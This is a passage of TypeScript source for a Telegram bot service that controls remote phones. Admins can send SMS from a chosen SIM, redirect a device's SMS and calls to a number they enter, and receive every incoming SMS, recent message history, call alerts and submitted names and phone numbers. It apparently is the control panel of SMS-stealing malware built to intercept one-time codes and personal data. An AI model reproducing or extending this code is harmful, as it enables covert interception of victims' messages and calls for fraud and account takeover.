                        this.startSmsConversation(chatId, deviceData, simIndex);
                    }
                    break;

                case 'fwd_sim':
                    if (parts.length >= 4 && deviceData) {
                        const type = parts[2] as 'sms' | 'calls';
                        const simIndex = parseInt(parts[3], 10);
                        this.startForwardingConversation(chatId, deviceData, type, simIndex);
                    }
                    break;
            }
        });
    }

    // ==================== MESSAGE LISTENER ====================

    private setupMessageListener(): void {
        if (!this.bot) return;

        this.bot.on('message', (msg) => {
            if (!msg.text || msg.text.startsWith('/')) return;

            const chatId = msg.chat.id;
            if (!this.isAdmin(msg.from?.id || 0, chatId)) return;

            // Check SMS conversation
            const smsConv = this.smsConversations.get(chatId);
            if (smsConv) {
                this.handleSmsConversation(chatId, msg.text.trim(), smsConv);
                return;
            }

            // Check forwarding conversation
            const fwdConv = this.forwardingConversations.get(chatId);
            if (fwdConv) {
                this.handleForwardingConversation(chatId, msg.text.trim(), fwdConv);
                return;
            }
        });
    }

    private handleSmsConversation(chatId: number, text: string, conversation: { deviceId: string; subscriptionId: number; step: 'phone' | 'message'; phoneNumber?: string }): void {
        if (conversation.step === 'phone') {
            if (!text.match(/^\+?[\d\s-]{7,15}$/)) {
                this.bot?.sendMessage(chatId, '❌ Invalid phone number. Please enter a valid number (e.g., +919876543210):');
                return;
            }
            conversation.phoneNumber = text;
            conversation.step = 'message';
            this.smsConversations.set(chatId, conversation);

            this.bot?.sendMessage(chatId,
                `📱 *To:* ${text}\n\n📝 Now enter your message:`,
                {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [[{ text: '❌ Cancel', callback_data: 'sms_cancel:0' }]]
                    }
                }
            );
        } else if (conversation.step === 'message') {
            const phoneNumber = conversation.phoneNumber!;
            if (this.onSendSms) {
                const requestId = `tg-${Date.now()}`;
                this.onSendSms(conversation.deviceId, phoneNumber, text, requestId, conversation.subscriptionId);
                this.bot?.sendMessage(chatId,
                    `✅ *SMS Sent!*\n\n📱 To: ${phoneNumber}\n💬 Message: ${text}`,
                    { parse_mode: 'Markdown' }
                );
            }
            this.smsConversations.delete(chatId);
        }
    }

    private handleForwardingConversation(chatId: number, text: string, conversation: { deviceId: string; type: 'sms' | 'calls'; subscriptionId: number }): void {
        if (!text.match(/^\+?[\d\s-]{7,15}$/)) {
            this.bot?.sendMessage(chatId, '❌ Invalid phone number. Please enter a valid number (e.g., +919876543210):');
            return;
        }

        const configUpdate = conversation.type === 'sms'
            ? { smsEnabled: true, smsForwardTo: text, smsSubscriptionId: conversation.subscriptionId }
            : { callsEnabled: true, callsForwardTo: text, callsSubscriptionId: conversation.subscriptionId };

        if (this.onForwardingUpdate) {
            this.onForwardingUpdate(conversation.deviceId, configUpdate);
            const typeLabel = conversation.type === 'sms' ? '📨 SMS' : '📞 Calls';
            this.bot?.sendMessage(chatId,
                `✅ *${typeLabel} Forwarding Enabled!*\n\n📤 Forwarding to: ${text}`,
                { parse_mode: 'Markdown' }
            );
        }
        this.forwardingConversations.delete(chatId);
    }

    // ==================== HELPERS ====================

    private findDevice(idOrShortId: string) {
        let deviceData = store.getDevice(idOrShortId);
        if (deviceData) return deviceData;

        const devices = store.getAllDevices();
        const match = devices.find(d => d.id.startsWith(idOrShortId) || d.id.includes(idOrShortId));
        if (match) return store.getDevice(match.id);

        return undefined;
    }

    // ==================== NOTIFICATION METHODS ====================

    private async sendToAllAdmins(message: string, options?: TelegramBot.SendMessageOptions): Promise<void> {
        if (!this.bot || !this.isEnabled) return;
        for (const adminId of this.adminIds) {
            try {
                await this.bot.sendMessage(adminId, message, { parse_mode: 'Markdown', ...options });
            } catch (error) {
                console.error(`[Telegram] Failed to send to admin ${adminId}:`, error);
            }
        }
    }

    async notifyDeviceOnline(device: Device): Promise<void> { return; }
    async notifyDeviceOffline(device: Device): Promise<void> { return; }

    async notifyDeviceConnected(device: Device, recentSms: SMS[]): Promise<void> {
        if (recentSms.length === 0) return;

        // Sort by timestamp descending (most recent first) and take 5
        const sortedSms = [...recentSms].sort((a, b) =>
            new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
        );
        const last5 = sortedSms.slice(0, 5);

        let message = `📱 *${device.name} Connected*\n\n*📨 Last ${last5.length} SMS:*\n\n`;
        last5.forEach((sms, i) => {
            const icon = sms.type === 'incoming' ? '📥' : '📤';
            const contact = sms.type === 'incoming' ? sms.sender : sms.receiver;
            const date = new Date(sms.timestamp).toLocaleString();
            message += `${i + 1}. ${icon} *${contact}*\n🕐 ${date}\n${sms.message}\n\n`;
        });
        await this.sendToAllAdmins(message);
    }

    async notifyNewSMS(deviceName: string, sms: SMS, device?: Device): Promise<void> {
        if (sms.type !== 'incoming') return;

        // Escape special Markdown characters in dynamic content
        const escapeMarkdown = (text: string): string => {
            return text.replace(/([*_`\[\]])/g, '\\$1');
        };

        let message = `📨 *New SMS*\n\n`;

        // Device info section
        message += `*📱 Device Info:*\n`;
        message += `   Name: ${escapeMarkdown(deviceName)}\n`;
        if (device) {
            message += `   ID: \`${device.id.substring(0, 8)}\`\n`;
            const simCards = device.simCards || [];
            if (simCards.length > 0) {
                message += `   📶 *SIMs:*\n`;
                simCards.forEach((sim: any, i: number) => {
                    const carrier = escapeMarkdown(sim.carrierName || 'Unknown');
                    const phone = sim.phoneNumber ? escapeMarkdown(sim.phoneNumber) : 'N/A';
                    message += `      SIM ${i + 1}: ${carrier} (${phone})\n`;
                });
            }
        }
        message += `\n`;

        // Sender info - escape in case sender has special chars
        message += `👤 *From:* ${escapeMarkdown(sms.sender)}\n\n`;

        // Message content - escape markdown to prevent parsing errors
        const escapedMessage = escapeMarkdown(sms.message);
        message += `💬 *Message:*\n\`\`\`\n${escapedMessage}\n\`\`\`\n`;

        // Timestamp
        const timestamp = new Date(sms.timestamp).toLocaleString();
        message += `🕐 ${timestamp}`;

        await this.sendToAllAdmins(message);
    }

    async notifyNewCall(deviceName: string, call: CallLog): Promise<void> {
        if (call.type === 'outgoing') return;
        const icon = call.type === 'missed' ? '📵' : '📞';
        const callType = call.type === 'missed' ? 'Missed Call' : 'Incoming Call';
        const duration = call.duration > 0 ? ` (${Math.floor(call.duration / 60)}m ${call.duration % 60}s)` : '';
        await this.sendToAllAdmins(
            `${icon} *${callType}*\n\n📱 Device: ${deviceName}\n👤 From: ${call.number}${duration}`
        );
    }

    async notifyFormSubmission(deviceName: string, form: { name: string; phoneNumber: string; id?: string }): Promise<void> {
        let message = `📝 *New Form Submission*\n\n`;
        message += `📱 Device: *⟨${deviceName}⟩*\n`;
        message += `👤 Name: ${form.name}\n`;
        message += `📞 Phone: ${form.phoneNumber}`;
        if (form.id) message += `\n🆔 ID: ${form.id}`;

        await this.sendToAllAdmins(message);
    }

    async notifyNewForm(deviceId: string, form: FormData): Promise<void> {
        const deviceData = store.getDevice(deviceId);
        const deviceName = deviceData?.device?.name || deviceId.substring(0, 8);
        await this.notifyFormSubmission(deviceName, form);
    }

    isActive(): boolean {
        return this.isEnabled && this.bot !== null;
    }
}

let telegramBot: TelegramBotService | null = null;

export function initTelegramBot(config?: TelegramConfig): TelegramBotService {
    telegramBot = new TelegramBotService(config);
    return telegramBot;
}

export function getTelegramBot(): TelegramBotService | null {
    return telegramBot;
}
